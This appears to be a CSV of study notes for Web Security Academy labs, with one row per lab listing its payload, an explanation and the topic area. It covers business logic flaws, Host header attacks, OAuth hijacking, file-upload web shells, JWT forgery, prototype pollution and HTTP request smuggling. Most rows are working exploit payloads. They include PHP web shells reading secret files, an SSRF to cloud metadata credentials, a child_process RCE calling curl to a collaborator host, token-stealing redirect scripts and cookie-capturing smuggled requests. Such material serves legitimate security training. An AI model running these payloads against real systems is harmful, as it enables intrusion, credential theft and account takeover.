150,Inconsistent handling of exceptional input,very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net,"using a very long email address is truncated to just 255 characters.

Make sure the very-long-string is the right number of characters so that the ‘m’ at the end of @dontwannacry.com is character 255.

This will then be truncated, so that the resulting address appears to be a valid @dontwannacry.com domain","Business Logic Vulnerabilities, Practitioner"
151,Weak isolation on dual-use endpoint,"POST /my-account/change-password

remove the current-password parameter, this still changes the password. Change password for administrator user.",Set username=administrator to change the password for the administrator user,"Business Logic Vulnerabilities, Practitioner"
152,Insufficient workflow validation,"GET /cart/order-confirmation?order-confirmation=true

Add the jacket to the basket.","POST /cart/checkout
 request redirects you to an order confirmation page via GET /cart/order-confirmation?order-confirmation=true

This order-confirmation page can be modified to modify the shopping order, bypassing the cart/checkout process.","Business Logic Vulnerabilities, Practitioner"
153,Authentication bypass via flawed state machine,"Drop GET /role-selector request, the default role administrator is applied to the account.","GET /role-selector is the request after logging in, this request can be dropped which sets the account to the default role which is administrator.","Business Logic Vulnerabilities, Practitioner"
154,Infinite money logic flaw,"POST /cart
POST /cart/coupon
POST /cart/checkout
GET /cart/order-confirmation?order-confirmed=true
POST /gift-card","Use the SIGNUP30 coupon to buy a 10 dollar gift card at 30% discount, which profits $3.

Run a macro in Burp:

""Project options"" > ""Sessions"". In the ""Session handling rules"" 
panel, click ""Add"". The ""Session handling rule editor"" dialog opens.
                    
In the dialog, go to the ""Scope"" tab. Under ""URL Scope"", select ""Include all URLs"".
                    
Go back to the ""Details"" tab. Under ""Rule 
actions"", click ""Add"" > ""Run a macro"". Under ""Select macro"", click 
""Add"" again to open the Macro Recorder.

In the list of requests, select GET /cart/order-confirmation?order-confirmed=true. Click ""Configure item"". In the dialog that opens, click ""Add"" to create a custom parameter. Name the parameter gift-card and highlight the gift card code at the bottom of the response. Click ""OK"" twice to go back to the Macro Editor.
                    
Select the POST /gift-card request and click ""Configure item"" again. In the ""Parameter handling"" section, use the drop-down menus to specify that the gift-card parameter should be derived from the prior response (response 4). Click ""OK"".","Business Logic Vulnerabilities, Practitioner"
155,Authentication bypass via encryption oracle,"xxxxxxxxxadministrator:your-timestamp

cookie format is administrator:your-timestamp","stay-logged-in
 cookie is encrypted.

Send the POST /post/comment
 and the subsequent GET /post?postId=x
 request (containing the notification cookie) to Burp Repeater.","Business Logic Vulnerabilities, Practitioner"
156,Basic password reset poisoning,"Modify Host header: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Modify username in body parameter: carlos. Use the temp-forgot-password-token obtained to change the password of Carlos account.","The forgot password functionality will send an email with a URL that contains the query parameter temp-forgot-password-token.

POST /forgot-password is used to trigger the password reset email, which contains the username as a body parameter.

Changing the Host header changes the URL of the password reset link in the email sent.

Generate a request with the exploit server as Host header and username as carlos. This will send a password reset link to Carlos’ email, when clicked, the temp-forgot-password-token will be included as a parameter in the request to the exploit server.","Apprentice, HTTP Host Header Attacks"
157,Host header authentication bypass,"GET /admin

Host header to localhost","Browse to /admin, error message reveals it can be accessed by local users.","Apprentice, HTTP Host Header Attacks"
158,Web cache poisoning via ambiguous requests,"Exploit server /resources/js/tracking.js
alert(document.cookie)

GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Remove cache buster, re-poison the cache so that users browsing to / are served the malicious js file.","The Host header is being validated in requests to /.

Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123

add a second Host header with an arbitrary value, this appears to be 
ignored when validating and routing your request. The arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js","HTTP Host Header Attacks, Practitioner"
159,Routing-based SSRF,"Host: 192.168.0.§0§

Identify the correct IP address, then browse to /admin with this as the Host header. Obtain a CSRF token when requesting /admin/delete. Use this to craft the full request.

Full query parameter:

GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos

Obtain session cookie, modify request to POST and send.","Insert a collaborator payload in the Host header, then note that interactions are made when requests are sent to the web server.

Use Intruder to replace the Host header with IP addresses, iterating up from 0 to 255 with a step of 1.","HTTP Host Header Attacks, Practitioner"
160,SSRF via flawed request parsing,"Scan IP range using Host header and Intruder.

Use absolute URL, obtain CSRF token, then generate the request

GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos

Obtain session cookie, then modify request to POST and include cookie.","Use an absolute URL instead of the standard URL.

e.g.GET https://YOUR-LAB-ID.web-security-academy.net/

This then allows for the Host header to be modified.

e.g.GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN

","HTTP Host Header Attacks, Practitioner"
161,SSRF via flawed request parsing,"Split the requests, one to / and one to the following. Obtain the necessary information in requests to /admin first.

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos

","Open two repeater tabs,

First one is standard to /
Second one is to /admin with Host header 192.168.0.1

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection)

Change the Connectionheader to keep-alive

Make note of the details such as path, username input and csrf token.

How it works: Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.","HTTP Host Header Attacks, Practitioner"
162,Authentication bypass via OAuth implicit flow,"POST /authenticate

change email address to carlos@carlos-montoya.net","Start of the OAuth flow:
GET /auth?client_id=[...]

logs user in with a POST request to /authenticate along with the access token. This flawed validation allows you to change the email address to another account and login with that.

Right-click on the POST
 request and select ""Request in browser"" > ""In original session"". Copy this URL and visit it in the browser.","Apprentice, OAuth"
163,Forced OAuth profile linking,"Intercept requests when linking a social media account. Copy the URL for GET /oauth-linking?code=[...]

Drop the request and log out so you have a valid code.

Exploit server:
<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE""></iframe>","Login as normal, then attach a social media profile to your account.

Once this is done, you can login with social media account, which is done with GET /auth?client_id[...] and a redirect_uri
 for this functionality sends the authorization code to /oauth-linking.

There is no state parameter, which acts as a CSRF token in OAuth. Obtain a valid code by intercepting and dropping a request, then deliver it to the victim in an iframe. When the victim browser loads the iframe, the src attribute points to the URL and completed the OAuth flow, attaching your social media profile to the admin account.","OAuth, Practitioner"
164,OAuth account hijacking via redirect_uri,"<iframe src=""https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email""></iframe>

Obtain an authorization code from victim, then use this to log in:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE","GET /auth?client_id=[...] and redirect_urialong with the authorization code in the query string.

Any value can be submitted for redirect_uri, allowing for authorization codes to be leaked.

","OAuth, Practitioner"
165,,"https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

Script to force a victim to visit the malicious URL and execute the script to steal their access token:

<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>","GET /auth?client_id=[...] and redirect_uri but the redirect uri is being validated against an allow list. However, you can perform a directory traversal e.g.

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1

This can be chained with an open redirect vulnerability elsewhere on the site. GET /post/next?path=[...] when clicking “Next Post” is vulnerable to open redirect.

Combine these two vulnerabilities and steal an access token using the Exploit Server.","OAuth, Practitioner, Review"
166,SSRF via OpenID dynamic client registration,"POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    ""redirect_uris"" : [
        ""https://example.com""
    ],
    ""logo_uri"" : ""https://BURP-COLLABORATOR-SUBDOMAIN""
}

Then replace the logo_uri value with the target URL when registering at /reg:

""logo_uri"" : ""http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/""

Get a new client ID and then request the information about it at GET /client/CLIENT-ID/logo","Client registration endpoint is /reg according to the OAuth config file.

Create a POST request to register client application with the OAuth service and include the logo_uri property.  This will cause a SSRF when GET requests are made to the logo.

Register a new client with the POST request, then make a GET call to obtain the logo information, which will perform the SSRF and steal the access key on the local server.

","OAuth, Practitioner"
167,Remote code execution via web shell upload,<?php echo file_get_contents('/home/carlos/secret'); ?>,GET /files/avatars/exploit.php HTTP/1.1,"Apprentice, File Upload"
168,Web shell upload via Content-Type restriction bypass,"<?php echo file_get_contents('/home/carlos/secret'); ?>

Change Content-Typeto image/jpeg",GET /files/avatars/<YOUR-IMAGE>,"Apprentice, File Upload"
169,Web shell upload via path traversal,"<?php echo file_get_contents('/home/carlos/secret'); ?>

POST request to upload the php file, include a ../ encoded

Content-Disposition: form-data; name=""avatar""; filename=""..%2fexploit.php""

GET /files/avatars/..%2fexploit.php","Server just outputs the contents of the PHP file as plain text.

Path traversal executes the script.

the / character need to be URL encoded.","File Upload, Practitioner"
170,Web shell upload via extension blacklist bypass,"<?php AddType application/x-httpd-php .l33t; ?>

name this exploit.l33t

<?php echo file_get_contents('/home/carlos/secret'); ?>","Create a PHP payload that maps an arbitrary extension (.l33t) to executable MIME type application/x-httpd-php

filename: .htaccess
Content-Type: text/plain

thanks to the malicious .htaccess file, the .l33t extension is executed as if it was .php, and the extension filter can be bypassed.","File Upload, Practitioner"
171,Web shell upload via obfuscated file extension,"<?php echo file_get_contents('/home/carlos/secret'); ?>

Content-Disposition header:

filename=""exploit.php%00.jpg""","Null byte payload will have the server accept it as jpg, but referred to as .php","File Upload, Practitioner"
172,Remote code execution via polyglot web shell upload,"<?php echo file_get_contents('/home/carlos/secret'); ?>

exiftool -Comment=""<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php","Creating a polyglot PHP/JPG file that contains the PHP payload in the metadata.

GET /files/avatars/polyglot.php

Use the message editors search feature to find the START string within the binary image data in the response. This will be the secret value.","File Upload, Practitioner"
173,JWT authentication bypass via unverified signature,"In the Inspector panel, change the value of the subclaim from wienerto administrator, then click Apply changes","Implementation flaws mean the server doesn’t verify the signature of the JWT.

You can simply modify the session token to gain access as another user","Apprentice, JWT"
174,JWT authentication bypass via flawed signature verification,"Change sub claim to administrator, change alg parameter to none. Apply changes","In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload.","Apprentice, JWT"
175,JWT authentication bypass via weak signing key,hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list,"Crack the JWT secret using hashcat. Then, generate a forged signed key using JWT Editor Keys in Burp and New Symmetric Key.

Then you can modify the JWT and sign this with a valid signature.","JWT, Practitioner"
176,JWT authentication bypass via jwk header injection,"Generate a new RSA key, select Embedded JWK in “Attack”.

A jwk parameter will be added to the header of the JWT containing the created public key","the jwk parameter in  the JWT header is used to embed the correct verification key directly in the token, but sometimes the server fails to check that the provided key came from a trusted source.

Generate a new RSA key in the JWT Editor Keys","JWT, Practitioner"
177,JWT authentication bypass via jku header injection,"Generate a new RSA key.

Add following to the exploit server based on the created information of the RSA key:

{
    ""keys"": [
        {
            ""kty"": ""RSA"",
            ""e"": ""AQAB"",
            ""kid"": ""893d8f0b-061f-42c2-a4aa-5056e12b8ae7"",
            ""n"": ""yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw""
        }
    ]
}

replace the kid header, add a new jku paramter with the exploit server URL uploaded. Click sign, and don’t modify headers.","The jku header might be supported in JWT’s, the server might fail to check the URL belongs to a trusted domain.

Upload a malicious JWK set to the exploit server.

replace the kid of the JWT, add the jku parameter.

Sign the JWT with the RSA key generated, make sure that the “Don’t modify header” option is selected and sign the token.","JWT, Practitioner"
178,JWT authentication bypass via kid header path traversal,"Modify the JWT’s kid parameter:

../../../../../../../dev/null

Generate a new key with a null byte (AA==) for the k property (secret key), sign the modified JWT with the null byte secret key.","The server uses the kid parameter to fetch the key from its filesystem.

Generate a new symmetric key, replace the generated value for the k property with a base64-encoded null byte (AA==).

Modify the kid parameter of the servers JWT to point to dev/null.

Change the sub parameter to administrator. Sign with generated symmetric key and “Don’t modify header”.

This will modify the token with a secret key that uses a null byte, the path traversal in the kid also points to /dev/null, so these will match and be accepted.","JWT, Practitioner"
179,DOM XSS via client-side prototype pollution,"/?__proto__[transport_url]=data:,alert(1);","DOM Invader:
1. Open Burp Browser, enable Prototype Pollution
2. Click Scan for Gadgets
3. script.src sink accessed via transport_url gadget.
4. Click Exploit

Manual:
1. /?__proto__[foo]=bar
Open Console → Object.prototype and note that it now has the foo property with the value bar.
2. Go to Sources, look for sinks. searchLogger.js has the config option with transport_url property.
3. /?__proto__[transport_url]=foo
Go to Elements, <script> element has been rendered with the src attribute foo.
Modify the payload so that the script element has a src attribute that will result in XSS.","Practitioner, Prototype Pollution"
180,DOM XSS via an alternative prototype pollution vector,/?__proto__.sequence=alert(1)-,"You need to append a minus character (-) to the DOM Invader POC as a numeric 1 is being appended. You can see this in the Console tab. The manager.sequence shows alert(1)1, which results in invalid JS syntax.","Practitioner, Prototype Pollution"
181,Client-side prototype pollution via flawed sanitization,"/?__pro__proto__to__[transport_url]=data:,alert(1);","The standard pollution vectors are being sanitized, but can be bypassed as the filter is not being applied recursively.","Practitioner, Prototype Pollution"
182,Client-side prototype pollution in third-party libraries,"<script>
location=""https://0ad100d0033f22eec134aff500b200eb.web-security-academy.net/#__proto__%5BhitCallback%5D=alert%28document.cookie%29""
</script>","Use DOM Invader to identify the 3rd party sink and gadget (setTimeout()) and hitCallback.

Modify the payload to alert the document.cookie, not just alert(1).","Practitioner, Prototype Pollution"
183,Client-side prototype pollution via browser APIs,"/?__proto__[value]=data:,alert(1);","script.srcsink via the valuegadget.

the Object.defineProperty()method is used to make the transport_urlunwritable and unconfigurable. However, it doesn't define a valueproperty.","Practitioner, Prototype Pollution"
184,Privilege escalation via server-side prototype pollution,"""__proto__"": {
    ""isAdmin"":true
}","POST /my-account/change-address
 request.

Add a new property to the JSON with the name _proto_:

""__proto__"": {
    ""foo"":""bar""
}

The response includes the arbitrary property injected, but not the _proto_ property, which indicates pollution is possible. Pollute the isAdmin property to escalate privileges. Note that you can see the isAdmin property in the response, and this is set to “false”","Practitioner, Prototype Pollution"
185,Detecting server-side prototype pollution without polluted property reflection,"""__proto__"": {
    ""status"":555
}","""_proto_"": {
""foo"":""bar""
}

This is not reflected in the response, if you break the JSON syntax, an error message is received. The error response is 500 but there is an status property in the JSON response body of 400. Fix the error and try to pollute the status property.

""__proto__"": {
    ""status"":555
}

remember this must be between 400 and 599.

Issue the request polluting the status property, then generate a new error. Note that the status returns 555, indicating that the prototype pollution is succesful.","Practitioner, Prototype Pollution"
186,Bypassing flawed input filters for server-side prototype pollution,"""constructor"": {
    ""prototype"": {
        ""isAdmin"":true
    }
}","""constructor"": {
    ""prototype"": {
        ""json spaces"":10
    }
}

Switch Response to Raw, then note that the number of spaces in the indentation has increased in the response.

The constructor property is an alternate if the _proto_ is not working or filtered.","Practitioner, Prototype Pollution"
187,Remote code execution via server-side prototype pollution,"""proto"": {
""execArgv"":[
""--eval=require('child_process').execSync('rm /home/carlos/morale.txt')""
]
}","""__proto__"": {
    ""json spaces"":10
}
Increases the indentation, indicates Prototype Pollution is possible.

POST /admin/jobs has a maintenance function that cleans up the database and filesystem. This might spawn child processes.

Pollute the _proto_ property with a malicious execArgv property that adds the —eval process to the spawned child process. This is done in the POST /my-account/change-address
 request.

""__proto__"": {
    ""execArgv"":[
        ""--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')""
    ]
}

Then, re-run the admin maintenance job. The job might fail but this will get a hit on the collaborator.

Replace the curl command with code to execute.","Practitioner, Prototype Pollution"
188,"HTTP request smuggling, basic CL.TE vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G","Submit this twice, the second request will respond with Unrecognized method GPOST

This is because the ""G"" that is added is appended to the start of the second request, making the method a “GPOST”","HTTP Request Smuggling, Practitioner, Review"
189,"HTTP request smuggling, basic TE.CL vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n","You need to include the trailing sequence \r\n\r\nfollowing the final 0.

Ensure that the ""Update Content-Length"" option is unchecked.","HTTP Request Smuggling, Practitioner, Review"
190,"HTTP request smuggling, obfuscating the TE header","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0",obfuscating transfer-encoding by sending two that are formatted differently,"HTTP Request Smuggling, Practitioner, Review"
191,"HTTP request smuggling, confirming a CL.TE vulnerability via differential responses","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X",Second request should receive a HTTP 404 response,"HTTP Request Smuggling, Practitioner, Review"
192,"HTTP request smuggling, confirming a TE.CL vulnerability via differential responses","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0",The second request should receive an HTTP 404 response.,"HTTP Request Smuggling, Practitioner, Review"
193,"Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=",This will provide access to the /admin interface.,"HTTP Request Smuggling, Practitioner, Review"
194,"Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability","POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0","Note the Host: http://localhost header in the smuggled request, this is what is bypassing the access control on the front-end.","HTTP Request Smuggling, Practitioner, Review"
195,Exploiting HTTP request smuggling to reveal front-end request rewriting,"POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1","the X-abcdef-Ip header should be replaced with the rewritten header of a test request smuggle:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test","HTTP Request Smuggling, Practitioner, Review"
196,Exploiting HTTP request smuggling to capture other users' requests,"POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test",smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.,"HTTP Request Smuggling, Practitioner, Review"
197,Exploiting HTTP request smuggling to deliver reflected XSS,"POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a""/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1","reflected XSS via the user agent header, the next visitor will receive the response to the smuggled request which will result in XSS","HTTP Request Smuggling, Practitioner, Review"
198,Response queue poisoning via H2.TE request smuggling,"POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net","This allows you to fetch arbitrary responses.

You can obtain the response to another users request, then steal their session cookies.","HTTP Request Smuggling, Practitioner, Review"
199,H2.CL request smuggling,"POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1

Exploit server resources file:

alert(document.cookie)","In Repeater, Allow HTTP/2 ALPN override option and disable the Update Content-Length option.

Change the protocol to HTTP/2 in Inspector

if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/

Add the arbitrary host header of the exploit server, this this will result in the victim making the request to the arbitrary host. Add a payload on the exploit server that executes JS.",HTTP Request Smuggling
200,HTTP/2 request smuggling via CRLF injection,"Add headers:

Namefoo
Valuebar\r\n
Transfer-Encoding: chunked

Request Body:

0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x","Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.

Add the two new headers, make sure to include the linebreak characters in the value of the foo header. Victim session cookie should be in the recent searches.",HTTP Request Smuggling
201,HTTP/2 request splitting via CRLF injection,"Namefoo
Valuebar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net","Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.

To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Returnkeys. Note that this feature is not available when you double-click on the header.

",HTTP Request Smuggling
202,CL.0 request smuggling,"POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Length: CORRECT

GET /admin/delete?username=carlos HTTP/1.1
Foo: x","Change request method on the first request, keep the second as GET.

POST /arbitraryendpointtotest HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x

This is used for testing, send group in sequence.",HTTP Request Smuggling
